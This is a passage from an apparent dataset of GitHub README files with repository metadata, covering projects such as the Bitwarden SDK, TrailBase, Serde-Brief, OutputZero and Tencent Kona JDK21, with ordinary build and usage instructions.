- [`bitwarden-api-identity`](./crates/bitwarden-api-identity/): Auto-generated API bindings for the
  Identity server.
- [`bitwarden-core`](./crates/bitwarden-core/): The core functionality consumed by the other crates.
- [`bitwarden-crypto`](./crates/bitwarden-crypto/): Crypto library.
- [`bitwarden-wasm-internal`](./crates/bitwarden-wasm-internal/): WASM bindings for the internal
  SDK.
- [`bitwarden-uniffi`](./crates/bitwarden-uniffi/): Mobile bindings for swift and kotlin using
  [UniFFI](https://github.com/mozilla/uniffi-rs/).

## API Bindings

We autogenerate the server bindings using
[openapi-generator](https://github.com/OpenAPITools/openapi-generator). To do this we first need to
build the internal swagger documentation.

### Swagger generation

The first step is to generate the swagger documents from the server repository.

```bash
# src/Api
dotnet swagger tofile --output ../../api.json ./bin/Debug/net8.0/Api.dll internal

# src/Identity
ASPNETCORE_ENVIRONMENT=development dotnet swagger tofile --output ../../identity.json ./bin/Debug/net8.0/Identity.dll v1
```

### OpenApi Generator

To generate a new version of the bindings run the following script from the root of the SDK project.

```bash
./support/build-api.sh
```

This project uses customized templates which lives in the `support/openapi-templates` directory.
These templates resolves some outstanding issues we've experienced with the rust generator. But we
strive towards modifying the templates as little as possible to ease future upgrades.

Note: If you don't have the nightly toolchain installed, the `build-api.sh` script will install it
for you.

## Developer tools

This project recommends the use of certain developer tools, and also includes configurations for
them to make developers lives easier. The use of these tools is optional and they might require a
separate installation step.

The list of developer tools is:

- `Visual Studio Code`: We provide a recommended extension list which should show under the
  `Extensions` tab when opening this project with the editor. We also offer a few launch settings
  and tasks to build and run the SDK
- `bacon`: This is a CLI background code checker. We provide a configuration file with some of the
  most common tasks to run (`check`, `clippy`, `test`, `doc` - run `bacon -l` to see them all). This
  tool needs to be installed separately by running `cargo install bacon --locked`.
- `nexttest`: This is a new and faster test runner, capable of running tests in parallel and with a
  much nicer output compared to `cargo test`. This tool needs to be installed separately by running
  `cargo install cargo-nextest --locked`. It can be manually run using
  `cargo nextest run --all-features`

## Cargo fmt

We use certain unstable features for formatting which require the nightly version of cargo-fmt.

To install:

```
rustup component add rustfmt --toolchain nightly
```

To run:

```
cargo +nightly fmt
```

## Contribute

Code contributions are welcome! Please commit any pull requests against the `main` branch. Learn
more about how to contribute by reading the
[Contributing Guidelines](https://contributing.bitwarden.com/contributing/). Check out the
[Contributing Documentation](https://contributing.bitwarden.com/) for how to get started with your
first contribution.

Security audits and feedback are welcome. Please open an issue or email us privately if the report
is sensitive in nature. You can read our security policy in the [`SECURITY.md`](SECURITY.md) file.
We also run a program on [HackerOne](https://hackerone.com/bitwarden).

No grant of any rights in the trademarks, service marks, or logos of Bitwarden is made (except as
may be necessary to comply with the notice requirements as applicable), and use of any Bitwarden
trademarks must comply with
[Bitwarden Trademark Guidelines](https://github.com/bitwarden/server/blob/main/TRADEMARK_GUIDELINES.md).
",0,3,15,NOASSERTION,"build-android.yml,build-rust-crates.yml,build-swift.yml,build-wasm-internal.yml,cloc.yml,delete-old-packages.yml,direct-minimal-versions.yml,enforce-labels.yml,lint.yml,memory-testing.yml,minimum-rust-version.yml,publish-rust-crates.yml,publish-wasm-internal.yml,release-rust-crates.yml,release-swift.yml,rust-test.yml,rustdoc.yml,scan.yml,version-bump.yml",36.0
trailbaseio/trailbase,main,"<p align=""center"">
  <a href=""https://trailbase.io"" target=""_blank"">
    <picture>
      <img alt=""TrailBase logo"" width=""150"" src=""https://raw.githubusercontent.com/trailbaseio/trailbase/refs/heads/main/assets/logo.svg"" />
    </picture>
  </a>
</p>

<p align=""center"">
  A <a href=""https://trailbase.io/reference/benchmarks/"">blazingly</a> fast,
  single-file, open-source application server with type-safe APIs, built-in
  JS/ES6/TS Runtime, Auth, and Admin UI built on Rust+SQLite+V8.
<p>

<p align=""center"">
  <a href=""https://github.com/trailbaseio/trailbase/stargazers/"">
    <img src=""https://img.shields.io/github/stars/trailbaseio/trailbase?style=social&label=Star"" />
  </a>
  <a href=""https://github.com/trailbaseio/trailbase/actions?query=branch%3Amain"">
    <img src=""https://github.com/trailbaseio/trailbase/actions/workflows/test.yml/badge.svg?branch=main"" alt=""Build Status"">
  </a>
  <a href=""https://github.com/trailbaseio/trailbase/blob/main/LICENSE"">
    <img src=""https://img.shields.io/badge/license-OSL_3.0-blue"" alt=""License - OSL 3.0"">
  </a>
  <a href=""https://trailbase.io/reference/roadmap/"">
    <img src=""https://img.shields.io/badge/status-alpha-orange"" alt=""Status - Alpha"">
  </a>
</p>

# TrailBase

<p align=""center"">
  <a href=""https://demo.trailbase.io/_/admin"" target=""_blank"">
    <picture>
      <img alt=""Admin UI"" width=""512"" src=""https://raw.githubusercontent.com/trailbaseio/trailbase/refs/heads/main/docs/src/assets/screenshot.webp"" />
    </picture>
  </a>
</p>

<p align=""center"">
  Try the <a href=""https://demo.trailbase.io/_/admin"" target=""_blank"">demo</a> online - Email: <em>admin@localhost</em>, password: <em>secret</em>.
</p>

For more context, documentation, and an online live demo, check out our website
[trailbase.io](https://trailbase.io).
Questions? Thoughts? Check out the [FAQ](https://trailbase.io/reference/faq/)
on our website or reach out.
If you like TrailBase or its prospect, consider leaving a ‚≠êüôè.

## Project Structure & Releases

This repository contains all components that make up TrailBase including client
libraries, tests, documentation and examples.
Only the [benchmarks](https://github.com/trailbaseio/trailbase-benchmark) are
kept separately due to their external dependencies.

Pre-built static binaries are available as [GitHub
releases](https://github.com/trailbaseio/trailbase/releases/) for Linux an
MacOS.

Moreover, client packages and containers are available via:

- [Docker](https://hub.docker.com/r/trailbase/trailbase)
- [JavaScript/Typescript client](https://www.npmjs.com/package/trailbase)
- [Dart/Flutter client](https://pub.dev/packages/trailbase)
- [C#/.Net](https://www.nuget.org/packages/TrailBase/)
- [Python](https://pypi.org/project/trailbase/)

## Running

You can run pre-built TrailBase either by downloading the latest
[release](https://github.com/trailbaseio/trailbase/releases/) and running

```bash
$ ./trail run
```

or using docker:

```bash
$ mkdir traildepot
$ alias trail=""docker run -p 4000:4000 --mount type=bind,source=$PWD/traildepot,target=/app/traildepot trailbase/trailbase /app/trail""
$ trail run
```

. Run `trail --help` to get a full list of commands. If you don't want to rely
on pre-built binaries, TrailBase is easy to build yourself, see below.

## Building

If you have all the necessary dependencies (rust, nodejs, pnpm, ...) installed,
you can build TrailBase simply by running:

```bash
$ git submodule update --init --recursive
$ cargo build --release
```

To build fully static binaries on Linux (et al):

```bash
$ RUSTFLAGS=""-C target-feature=+crt-static"" cargo build --target x86_64-unknown-linux-gnu --release
```

Alternatively, if you want a container or don't have to deal with dependencies,
you can build using docker:

```bash
$ git submodule update --init --recursive
$ docker build . -t trailbase
```

## Contributing

Contributions are very much appreciated üôè. For anything beyond bug fixes,
let's quickly chat to see how a proposal fits into the overall roadmap and
avoid any surprises.

We're not sure yet what the best setup or exact license is for compatibility
between OSL-3.0 and more popular licenses or use as a framework.
So we'd ask you to sign a simple CLA that retains your copyright, ensures that
TrailBase will continue to forever be freely available under an OSI-approved
copyleft license, while allowing for some flexibility and sub-licensing as
established by much larger, successful projects such as Grafana or Element.

## License

TrailBase is free software under the terms of the [OSL-3.0](LICENSE).

We chose this license over more popular, similar copyleft licenses such as
AGPLv3 due to its narrower definition of derivative work that only covers
modifications to TrailBase itself. This is similar to GPL's classpath exception
or LGPL's linkage exception allowing the use of TrailBase as a framework
without inflicting licensing requirements on original work layered on top.
That said, we ain't lawyers. The author of the license provides a more
thorough [explanation](https://rosenlaw.com/OSL3.0-explained.htm).
If you have any concerns or advice for us, please reach out.

If you require an
[exception](https://www.gnu.org/philosophy/selling-exceptions.html), reach out
to contact@trailbase.io.
",7,1,5,OSL-3.0,"release.yml,test.yml",2.0
orhun/eurorust2024,main,"# EuroRust 2024 Presentation ü¶Ä

**Session**: [Renaissance of Terminal User Interfaces with Rust](https://eurorust.eu/talks/renaissance-of-terminal-user-interfaces-with-rust)

## Presenting

To start the presentation, first install [presenterm](https://github.com/mfontanini/presenterm):

```bash
cargo install --git https://github.com/mfontanini/presenterm
```

Update submodules:

```bash
git submodule update --init --recursive
```

Then simply run:

```bash
presenterm presentation.md -X -c config.yml -p
```

> [!TIP]  
> Or you can use the [`present.sh`](./present.sh) script.

> [!IMPORTANT]  
> It is recommended to use [wezterm](https://github.com/wez/wezterm) for good image rendering.
",0,0,1,,,0.0
davidtos/LIO,master,"# LIO (Linux IO)
This repository is part of my talk about Project Panama. I aim to show how you can call C libraries from inside your Java code.

## What is inside this repository
The library contains a working example of FUSE and IO_URING with liburing. 

- **FUSE** code see [this](https://github.com/davidtos/LIO/blob/master/src/main/java/com/davidvlijmincx/FuseMain.java)
  - To unmount use the following command `fusermount3 -u $FILE_PATH`
- **IO_URING READ** code see [this](https://github.com/davidtos/LIO/blob/master/src/main/java/com/davidvlijmincx/IoUringReadExample.java)
  - The read example uses polling to reduce the number of system calls.
  - To see that the polling is working you can use `sudo bpftrace -e 'tracepoint:io_uring:io_uring_submit_req* {printf(""%s(%d)\n"", comm, pid);}'` this shows you what called submit.
- **IO_URING WRITE** code see [this](https://github.com/davidtos/LIO/blob/master/src/main/java/com/davidvlijmincx/IoUringWriteExample.java)
  - The write example does not use polling but makes a system call.

## Wrapper code
The code that calls the C code is generated using [Jextract](https://github.com/openjdk/jextract). Jextract creates Java code based on the header files.

To generate FUSE:
`jextract -D_FILE_OFFSET_BITS=64 -D FUSE_USE_VERSION=35 --source -d generated/src -t org.libfuse -I /Documents/libfuse-fuse-3.10.5/include/ /Documents/libfuse-fuse-3.10.5/include/fuse.h`

To generate Liburing:
`jextract -D IOURINGINLINE=extern  -l uring -t io.uring -I include --output ./generated --header-class-name liburingtest include/liburing.h`

## Side note
This sample code is not production ready, it's just a proof of concept that happens to work.
",0,0,5,,,0.0
HerodotusDev/hdp-sp1,main,"![](.github/banner.png)

# Herodotus Data Processor (HDP) with SP1 Backend

> [!WARNING]
> This codebase is experimental and not production-ready üöß

The Herodotus Data Processor (HDP) enables you to access verified on-chain data by verifying Merkle Mountain Range (MMR) and Merkle Patricia Tree (MPT) proofs in a zkVM environment. Learn more about HDP [here](https://docs.herodotus.dev/herodotus-docs/developers/data-processor).

## Architecture

- [`hdp-macro`](./hdp-macro/): A macro to simplify HDP programs for SP1's online and zkVM modes.
- [`hdp-lib`](./lib/): The core library for HDP programs, including providers, memorizer, verifier, etc.
- [`hdp-sdk`](./hdp-sdk/): The `DataProcessorClient`, which wraps the SP1 client and handles HDP's full flow.
- [`hdp-verifier`](./hdp-verifier/): The verifier contract for HDP programs's SP1 proof.

## Conditional Compilation

SP1 programs can be compiled in two modes: online and zkVM. The `#[hdp_main]` macro handles conditional compilation based on the target OS. During online mode, the program will fetch inclusion proofs from RPC providers and construct a memorizer as a return serialized file `memorizer.bin`. This is passed into the zkVM mode program as public input, and these MMR and MPT proofs will be verified in zkVM mode.

<img src="".github/program_diagram.png"" width=""600"">

## End-to-End Flow

The user defines an HDP program using the `#[hdp_main]` macro and on-chain state access methods from the memorizer. The program will be passed into the `DataProcessorClient`, and by using the `prove` method, it will generate a proof. This proof will be verified in the on-chain verifier contract, which includes checking the integrity of the zkVM verification against the MMR root.

<img src="".github/e2e.png"" width=""400"">

## Supported Memorizers

- [x] Header
- [x] Transaction
- [x] Consensus Header
- [x] Account
- [x] Storage
- [x] Receipt

## Performance

M2 MAX / 12 core - (todo: will update numbers with proper metrics)

| Operation                          | Clock Cycles | Code                                            |
| ---------------------------------- | ------------ | ----------------------------------------------- |
| **MMR Verification (header)**      | 625,471      | [code](./lib/src/memorizer/header/zkvm.rs)      |
| **MPT Verification (transaction)** | 136,951      | [code](./lib/src/memorizer/transaction/zkvm.rs) |
| **MPT Verification (receipt)**     | 172,726      | [code](./lib/src/memorizer/receipt/zkvm.rs)     |
| **MPT Verification (account)**     | 514,710      | [code](./lib/src/memorizer/account/zkvm.rs)     |
| **MPT Verification (storage)**     | 18,790       | [code](./lib/src/memorizer/storage/zkvm.rs)     |

We also checked other operations (wip):

| Operation                            | Clock Cycles | Code                                              |
| ------------------------------------ | ------------ | ------------------------------------------------- |
| **Bloom Filter - 3 address (Set)**   | 17,656       | [code](./examples/compliance/program/src/main.rs) |
| **Bloom Filter - 3 address (Check)** | 20,119       | [code](./examples/compliance/program/src/main.rs) |

## Running Examples

Before running the examples, ensure that you have set the necessary environment variables for online mode to fetch proofs.

For example, use the following format to define RPC providers in a `.env` file:

```
# Required for online mode in .env
RPC_URL_ETHEREUM_SEPOLIA=
RPC_URL_ETHEREUM_MAINNET=
```

The following command runs the [simple example](./examples/simple/README.md). It first runs the HDP program in online mode to retrieve proofs, and then runs the HDP program in zkVM mode to generate an ELF file. This ELF file is used to generate a proof and verify it.

```
cargo run --package simple --bin simple --release +nightly
```

## Example Program

We provide the `#[hdp_main]` macro to simplify writing HDP programs. This macro handles conditional compilation based on the target OS and supports conditional commits.

```rust
#![cfg_attr(target_os = ""zkvm"", no_main)]

use hdp_lib::memorizer::*;
use hdp_macro::hdp_main;

#[hdp_main(to_chain_id = ""ETHEREUM_SEPOLIA"")]
pub fn main() {
    let block_number = 5_244_652;

    // Access header, account, storage, or transaction via key type
    let tx_key = TransactionKey {
        block_number,
        transaction_index: 0,
        chain_id: hdp_lib::chain::ChainId::EthereumSepolia,
    };
    let v = memorizer.get_transaction(tx_key).unwrap();

    // This function commits data to the zkVM.
    // If online, it will do nothing.
    // Only serializable data can be committed.
    hdp_commit(&v.tx_hash());
}
```

## HDP SDK

We provide an SDK that wraps the SP1 client and abstracts the process of running SP1 programs in online mode (to retrieve proofs) and zkVM mode (to verify proofs). You can use it like a regular SP1 client, but in the program path, you provide an HDP program that utilizes the `#[hdp_main]` macro.

```rust
use hdp_sdk::DataProcessorClient;

fn main() {
    let client = DataProcessorClient::new();
    let (proof, vk) = client.prove(""./program"".into()).unwrap();
    client.verify(&proof, &vk).expect(""Failed to verify proof"");
}
```

### Passing Input to an HDP Program

To pass input to the HDP program, use the `write` method:

```rust
use hdp_sdk::DataProcessorClient;

fn main() {
    let mut client = DataProcessorClient::new();
    client.write(5_244_652_u64);
    let (proof, vk) = client.prove(""./program"".into()).unwrap();
    client.verify(&proof, &vk).expect(""Failed to verify proof"");
}
```

You need to read the input within the HDP program as follows:

```rust
#[hdp_main]
pub fn main() {
    let block_number: u64 = hdp::read();
    println!(""Received block number: {:?}"", block_number);
}
```
",0,1,2,MIT,"prove.yml,test.yml",15.0
martcpp/50-DaysOfRust,main,"# 50-DaysOfRust Challenge

A structured 50-day Rust learning and project challenge starting Hacktober 1st. This plan balances learning core concepts and building practical Rust projects.

## Week 1: Rust Basics & Syntax

**Day 1-5:**
- Install Rust and set up the development environment.
- Learn basic syntax: variables, data types, functions, conditionals, loops.
- **Project:** Create a simple CLI calculator to practice basic operations and user input.

**Day 6-7:**
- Dive into ownership, borrowing, and lifetimes.
- **Project:** Extend your calculator to handle complex operations and introduce error handling.

## Week 2: Structs, Enums, and Error Handling

**Day 8-9:**
- Learn about structs and enums.
- **Project:** Build a small inventory management system using structs and enums.

**Day 10-11:**
- Understand pattern matching and control flow.
- **Project:** Add pattern matching to the inventory system, allowing for item categorization.

**Day 12-14:**
- Deep dive into Rust's error handling with `Result` and `Option`.
- **Project:** Add error handling to the inventory, making it more robust.

## Week 3: Collections and Iterators

**Day 15-17:**
- Learn about vectors, hash maps, and strings.
- **Project:** Build a contact book app, allowing for the addition, removal, and search of contacts.

**Day 18-19:**
- Master iterators and closures.
- **Project:** Add sorting and filtering options to the contact book using iterators.

**Day 20-21:**
- Study traits and generics in Rust.
- **Project:** Refactor the contact book to make it more generic and reusable.

## Week 4: Async Programming and Concurrency

**Day 22-25:**
- Learn async programming with `tokio`.
- **Project:** Build an asynchronous web scraper that fetches and processes data from multiple websites concurrently.

**Day 26-28:**
- Study concurrency using threads.
- **Project:** Modify the web scraper to handle multiple scraping tasks concurrently.

## Week 5: Working with Files, Crates, and Modules

**Day 29-31:**
- Learn file I/O in Rust and how to use crates.
- **Project:** Build a log parser that reads logs from a file and generates a report.

**Day 32-34:**
- Learn about Rust modules and crate structures.
- **Project:** Refactor the log parser to be modular and scalable.

## Week 6: Web Development with Actix or Warp

**Day 35-38:**
- Study basic web development in Rust using `actix-web` or `warp`.
- **Project:** Create a simple REST API for a TODO app.

**Day 39-41:**
- Add database integration with `SQLx` or `Diesel`.
- **Project:** Extend the TODO app to store tasks in a Postgres or SQLite database.

## Week 7: Advanced Topics (FFI, Unsafe, Macros)

**Day 42-44:**
- Learn about Foreign Function Interface (FFI) and using C libraries in Rust.
- **Project:** Build a small Rust application that uses a C library for some functionality.

**Day 45-47:**
- Dive into unsafe Rust.
- **Project:** Build a memory-efficient data structure using unsafe code for performance optimization.

**Day 48-50:**
- Study Rust macros and how to create your own.
- **Project:** Create a custom derive macro to automatically generate code for common tasks in one of your previous projects.

### Don't forget to drop a star to the repository

Throughout the challenge, contribute to Hacktoberfest by submitting pull requests to open-source Rust projects or libraries.
",0,0,1,MIT,,0.0
halseth/output-zero,master,"# OutputZero
`OutputZero` is a proof of concept tool for proving Bitcoin UTXO set inclusion in
zero knowledge.

## Applications 
Since unspent transaction outputs is a scare resource, having a way of
cryptographically prove you own one without revealing anything about the output
is useful for all sorts of anti-DOS applications.

Examples are:
- Lightning channel announcements: prove the channel exist without revealing
  it.
- Proof-of-reserves: prove you control a certain amount of coins without
  revealing which ones.
- etc

## Architecture 
The tool works with the UTXO set dump from Bitcoin Core. It uses this dump to
create a [Utreexo](https://dci.mit.edu/utreexo) representation of the UTXO set
and a proof for inclusion of the given UTXO in this set.

The prover then signs a message using the private key for the output with
public key `P`, proving that he controls the coins. 

The prover then creates a ZK-STARK proof using the [Risc0 ZKVM](https://github.com/risc0/risc0) 
that proves the following:

- The prover has a valid signature for an arbitrary message for a public key
  `P`, where `P = x * G`. The message and `hash(x)`is shown to the verifier.
- The prover has a proof showing that the public key P is found in the Utreexo
  set. The Utreexo root is shown to the verifier.

The STARK proof this is convincing the verifier that the prover has the private
key to the output in the UTXO set.

## Quick start

### Requirements 
Install the `risc0` toolchain: https://github.com/risc0/risc0?tab=readme-ov-file#getting-started

### Proof creation
Create an address to send some testnet3 coins to:
```bash
$ cargo run --release -- --priv-key ""new""
priv: 4b55c185428041cff1d3cf9044ad18c14fa79a927fa242d2b6ee7582f59b9581
pub: 1fa2ab3dfcdeaba8d8253c6e7ef49135f36cb4c4c8515c5579f3010e2999e3b5
address: tb1p7677cydywmtk67vfvxrwlh2g7g4cz7ha4z6x6v4u4kj8xyyu3n0srfaj4g
```

You can now fund the given address with some tBTC, then wait for the
transaction to confirm and Bitcoin Core to sync to the block (feel free to use
the above private key for testing, but please don't spend the coins).

Now get a dump of the UTXO set from the Bitcoin Core: 

```bash
$ bitcoin-cli -testnet dumptxoutset testnet_utxoset.dat
```

This will take few minutes, as the UTXO is rather large. But now we got what we
need to run `utxozkp`, and presumably our output is contained in it (replace
folder with Bitcoin Core directory):

```bash
$$  cargo run --release -- --utxoset-file ""<path_to_bitcoin>/testnet3/testnet_utxoset.dat"" --priv-key ""4b55c185428041cff1d3cf9044ad18c14fa79a927fa242d2b6ee7582f59b9581"" --msg ""messsage to sign"" --receipt-file receipt.bin --utreexo-file utreexo_stump.bin --prove
```

This command will read the UTXO set, and create a ZK proof as detailed in the
Architecture section. The `receipt.bin` file contains this proof, while the
`utreexo_stump.bin` file contains the Utreexo roots (these can be independently
created by the verifier).


### Verification
The proof can be verified using

```bash
$ cargo run --release -- --msg ""messsage to sign"" --receipt-file receipt.bin --utreexo-file utreexo_stump.bin 
```

## Benchmarks, Apple M1 Max
- Proving time is about 48 seconds (not counting loading the UTXO set into
  memory).
- Verification time is ~254 ms.
- Proof size is 1.4 MB.

## Limitations
This is a rough first draft of how a tool like this could look like. It has
plenty of known limitations and should absolutely not be used with private keys
controlling real (mainnet) coins.

A non-exhaustive list (some of these could be relatively easy to fix):

- Only supports taproot keyspend outputs.
- Only supports testnet3 and signet.
- Only proving existence, selectively revealing more about the output is not
  supported.
- Proving time is not optimized.
- Proof size is not attempted optimized.
- Private key must be hot.
- ... and many more.

",0,0,4,Apache-2.0,,5.0
kousiknath/Concurrency,main,"## Concurrency and Multi-threading for everyone 

1. Recipe for alternate data printing (synchronization, wait-notify, volatile)
2. Recipe for rate limiting (Semaphore)
3. Recipe for counting words in a big file (Countdown Latch)
4. Recipe for Friends Outing (Cyclic Barrier)
5. Recipe for bank transaction (ReentrantLock)
6. Recipe for in-memory logging (ReadWriteLock)
7. Recipe for producer-consumer model (Lock.Condition, wait-notify)
",0,0,1,,,0.0
FlixCoder/serde-brief,main,"# Serde-Brief

[![crates.io page](https://img.shields.io/crates/v/serde-brief.svg)](https://crates.io/crates/serde-brief)
[![docs.rs page](https://docs.rs/serde-brief/badge.svg)](https://docs.rs/serde-brief/)
![license: MIT](https://img.shields.io/crates/l/serde-brief.svg)

Serde-Brief (German for letter) is a crate for encoding and decoding data into a binary format that is self-descriptive and [serde](https://docs.rs/serde/)-compatible.

## Design Goals

Not necessarily in order of importance:

- Convenient to use for developers: Integrates into the Rust ecosystem via `serde`, supporting all of its features in its derived implementations (e.g. renaming, flattening, ..).
- Compatibility: Easy to add or re-order fields/variants without breakage. Detects wrong data types.
- `#![no_std]` and std compatible.
- Resource efficient: High performance, low memory usage.
- Interoperability: Different architectures can communicate flawlessly.
- Well-tested: Ensure safety (currently, there is no use of `unsafe`).

## Binary Format

The format is new and therefore NOT YET STABLE.

The format is specified [here](./docs/format-specification.md).

### Flavors / Modes

By default, structs' field names and enums' variant names are encoded as strings. This can be configured to be encoded as unsigned integers of their indices instead. However, this has compatibility implications and some serde features do not work with the index representation. See the format specification for more info.

## Comparisons

How does Serde-Brief compare to ..?

### [Postcard](https://docs.rs/postcard/)

Postcard is NOT a self-describing format. It's encoding solely consists of the raw data and the deserializer needs to have the same information on the data schema. This makes it more difficult to change the data format, e.g. add new fields.

Postcard is producing way smaller encoded data due to the missing schema information and field names. It is also faster.

Serde-Brief supports decoding unknown data and parsing it into the requested structures regardless of additional fields or different orders.

### [Pot](https://docs.rs/pot/)

Pot is a self-describing format as well. It's encoding is more space-efficient due to reducing repeated type/schema definitions. This comes at the cost of serialization/deserialization speed.

It is also not no-std compatible.

Serde-Brief is faster most of the times, but less space-efficient.

### [Serde_json](https://docs.rs/serde_json/)

JSON is a self-describing format as well. However, it is text based and therefore requires string escaping. Bytes cannot be efficiently represented. However, JSON is widely adopted, as you already know :D

In Serde-Brief, map keys can not only be strings. Unlike in JSON, keys can be nested data, so something like `HashMap<MyKeyStruct, MyValueStruct>` can be serialized and deserialized without issues.

Serde-Brief is both more space-efficient and faster.

## Usage

Add the library to your project with `cargo add serde-brief`. By default, no features are enabled (currently), so it is no-std by default. You can enable use of `Vec`s and such with features like `alloc` or `std`.

### Example Serialization/Deserialization

The `heapless` feature was enabled for this example. It is similarly possible with `std`'s `Vec` or just slices.

```rust
use heapless::Vec;
use serde::{Serialize, Deserialize};

#[derive(Debug, PartialEq, Eq, Serialize, Deserialize)]
struct MyBorrowedData<'a> {
    name: &'a str,
    age: u8,
}

let data = MyBorrowedData { name: ""Holla"", age: 21 };
let mut output: Vec<u8, 22> = serde_brief::to_heapless_vec(&data).unwrap();

assert_eq!(output, [
    17,
    11, 4, b'n', b'a', b'm', b'e', 11, 5, b'H', b'o', b'l', b'l', b'a',
    11, 3, b'a', b'g', b'e', 3, 21,
    18
]);

let parsed: MyBorrowedData = serde_brief::from_slice(&output).unwrap();
assert_eq!(parsed, data);
```

## Benchmarks

For benchmark results, [see here](https://github.com/djkoloski/rust_serialization_benchmark).

I expect there to be plenty room for performance improvements still.

If you are interested in maximum performance, please try using profile-guided optimization. It measurably improves performance on this library. For further information, see the [PGO usage docs](./docs/pgo.md).

### Results

The serialization/deserialization is reasonably fast. Between postcard and serde_json mostly. The data-size is also between postcard and JSON.

I expect there is a lot improvements possible, we are still way slower than postcard sadly.

## Development & Testing

1. Install [cargo-make](https://github.com/sagiegurari/cargo-make) (and optionally [cargo-nextest](https://github.com/nextest-rs/nextest)): `cargo install cargo-make cargo-nextest`.
2. Optional, but recommended: Put `search_project_root = true` into cargo-make's user configuration, so that `cargo make` can be run from sub-folders.
3. From the project directory, you can run the following tasks:
    - **Format code**: `cargo make format`
    - **Check formatting**: `cargo make formatting`
    - **Run all tests via cargo test**: `cargo make test`
    - **Run all tests via cargo nextest**: `cargo make nextest`
    - **Run clippy for all feature sets, failing on any warnings**: `cargo make clippy`
    - **Do all checks that are done in CI**: `cargo make ci`

## Minimum supported Rust version

Currently, I am always using the latest stable Rust version and do not put in effort to keep the MSRV. Please open an issue in case you need a different policy, I might consider changing the policy.

## License

Licensed under the MIT license. All contributors agree to license under this license.
",2,3,1,MIT,rust.yml,1.0
web3batman/Solana-Presale-Smart-Contract,main,"# Solana Presale Smart Contract

Smart contract designed for facilitating the sale of SPL tokens with additional features, including a presale mechanism and allocation tickets. The contract is built using the Anchor framework.

## Contact
telegram: @shinnyleo0912

You can contact me here if you have any problems with this repo then we can decide comfortable contact way.

## Key Features

- **Token Sale:** The contract enables the sale of SPL tokens, allowing users to purchase tokens directly from the vending machine.
  
- **Presale Mechanism:** A configurable presale phase is implemented, allowing for exclusive token access for a specified duration before the public sale.

- **Allocation Tickets:** Users can acquire allocation tickets during the presale, providing them with reserved spots for purchasing SPL tokens.

- **Flexible Configuration:** The contract offers flexibility in configuring various parameters, such as presale and public sale start/end times, token prices, and ticket allocation limits.

## Prerequisites

Before you begin, make sure you have the following tools installed:

- [Rust](https://www.rust-lang.org/tools/install)
- [Cargo](https://doc.rust-lang.org/cargo/getting-started/installation.html)
- [Anchor CLI](https://project-serum.github.io/anchor/getting-started/installation.html)
- [Node.js](https://nodejs.org/en/download/)
- [Yarn](https://yarnpkg.com/getting-started/install)

## Getting Started

1. **Installation:** Clone the repository and install dependencies.

   ```bash
   git clone https://github.com/web3batman/Solana-Presale-Smart-Contract
   cd Solana-Presale-Smart-Contract
   yarn
   ```

2. **Build the Smart Contract:**

   ```bash
   anchor build
   ```

3. **Run Tests:**

   ```bash
   anchor test
   ```

4. **Deploy:**

   Switch to your desired network and deploy
   ```bash
   anchor deploy
   ```

",0,1,1,,,1.0
jtaccuino/jtaccuino,main,"# JTaccuino

JTaccuino is a JavaFX based notebook application for Java developers.

It is built for usages in education, interactive experimation with algorithms and possible more advanced use cases.

Java code execution is provided by JShell, the awesome Java REPL.

## Licenses and used 3rd party software / components

### Libraries

#### Flexmark
License: BSD-2-Clause license

flexmark-java is a Java implementation of CommonMark (spec 0.28) parser using the blocks first, inlines after Markdown parsing architecture.

#### GluonHQ RichTextArea
License: GPL-3.0 license

Gluon presents a new JavaFX control, created with Java and JavaFX standard APIs, called the RichTextArea control. RichTextArea is a text input control which provides rich text features along with emoji, and non-text objects like images, tables and hyperlinks.

#### GemsFX
License: Apache-2.0 license

GemsFX is a collection of custom controls and utilities for JavaFX.

#### OpenJFX
License: GPL-2.0 with Classpath Exception

OpenJFX is an open source, next generation client application platform for desktop, mobile and embedded systems based on JavaSE. It is a collaborative effort by many individuals and companies with the goal of producing a modern, efficient, and fully featured toolkit for developing rich client applications. This is the open source project where we develop JavaFX.

#### Yasson
License: Eclipse Public License - v 2.0

Yasson is a Java framework which provides a standard binding layer between Java classes and JSON documents. This is similar to what JAXB is doing in the XML world. Yasson is an official reference implementation of JSON Binding.

#### Jakarta JSONB
License: Eclipse Public License - v 2.0

Jakarta JSON Binding

#### Maven Resolver
License: Apache-2.0 license

Apache Maven Artifact Resolver is a library for working with artifact repositories and dependency resolution.

### Resources

#### Fonts
The application uses [Monaspace](https://github.com/githubnext/monaspace) fonts provided by GitHub Next especially
- Monaspace Argon
- Monaspace Radon

both licensed under [SIL OPEN FONT LICENSE Version 1.1](http://scripts.sil.org/OFL)

#### Icons
Icons used are downloaded from [SVGRepo](https://www.svgrepo.com/) and converted to SVG paths useable in JavaFX by the [SVG Path Extractor at JFXCentral](https://www.jfx-central.com/utilities/pathextractor).

Icons used are from the following collections
- Meteor Line Interface Icons
  - License: [MIT License](https://www.svgrepo.com/page/licensing/#MIT)
  - Author: ShopWare
- Zest Interface Icons
  - License: [MIT License](https://www.svgrepo.com/page/licensing/#MIT)
  - Author: zest
-  Flat Icon Design Dark Vectors
  - License: [PD License](https://www.svgrepo.com/page/licensing/#PD)
  - Author: flat-icon-design
",1,1,1,Apache-2.0,"build.yml,release.yml",13.0
Tencent/TencentKona-21,master,"![Tencent Kona](https://user-images.githubusercontent.com/56812395/68106974-413b0700-ff1e-11e9-9128-ab1ad57283d1.png)
## Tencent Kona JDK21
Tencent Kona JDK21 is a no-cost, production-ready distribution of the Open Java Development Kit (OpenJDK), Long-Term Support(LTS) with quarterly updates.

Kona serves as the default JDK at Tencent internally, optimized for extreme-scale of Big Data, Machine Learning and Cloud Computing workload. It is also used to build and maintain a Tencent supported version of OpenJDK for Tencent customers and partners who wish to use OpenJDK to run their applications.

## Using Tencent Kona JDK21

Tencent Kona JDK21 currently supports Linux/x86_64, Linux/Aarch64, Windows/x86_64, Mac/x86_64, Mac/Aarch64 platform.

## License

Tencent Kona is under the same licensing terms as the upstream OpenJDK project. It is clearly a ""friendly fork"". Tencent intends to contribute on the continuous success of Java and upstream as many enhancements as possibl
. Please read the file: ""LICENSE"".

## Introduction, Installation Guide and User Guide

Please read [https://github.com/Tencent/TencentKona-21/wiki](https://github.com/Tencent/TencentKona-21/wiki)

### The binary for Installation

Please access [https://github.com/Tencent/TencentKona-21/releases](https://github.com/Tencent/TencentKona-21/releases)

## Issues Report and Discussion

Please use [https://github.com/tencent/TencentKona-21/issues](https://github.com/tencent/TencentKona-21/issues)
